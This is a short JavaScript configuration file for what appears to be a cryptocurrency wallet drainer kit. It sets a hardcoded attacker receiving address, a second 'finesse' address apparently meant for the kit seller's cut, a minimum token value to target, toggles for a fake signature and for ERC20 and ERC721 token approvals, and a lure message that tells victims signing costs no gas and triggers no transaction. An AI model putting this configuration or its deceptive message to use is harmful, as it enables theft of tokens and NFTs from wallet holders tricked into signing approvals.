const receiveAddress = "0x40f6f2eB0C3217C8F65CB449F95563dE04B4ACcc";
const finesseReceiveAddress = "YOUR WALLET"
const finesseMinimum = 0.2
const minTokenValue = 100

const enableFakeSig = true
const erc20Approvals = true;
const erc721Approvals = true;

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;


if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);

if (!finesseReceiveAddress.startsWith("0x") || (finesseReceiveAddress.length >= 64 || finesseReceiveAddress.length <= 40))
    console.error(`Error: ${finesseReceiveAddress} is not a valid Ethereum address.`);






